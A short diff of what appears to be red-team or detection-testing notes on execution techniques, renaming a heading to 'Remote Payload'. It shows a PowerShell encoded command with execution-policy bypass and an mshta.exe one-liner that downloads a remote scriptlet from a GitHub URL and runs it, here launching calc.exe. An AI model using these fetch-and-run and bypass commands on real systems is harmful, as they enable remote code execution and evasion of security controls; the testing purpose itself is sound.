@@ -14,7 +14,7 @@ powershell -noprofile -noninteractive -executionpolicy bypass -encodedcommand cA
 ## MSHTA
 The command will use MSHTA to download a payload that executes calc.exe
 
-### Standard Execution
+### Remote Payload
 mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/losttroll/runcalc/main/calc.sct").Exec();close();
 
 ### Local Payload
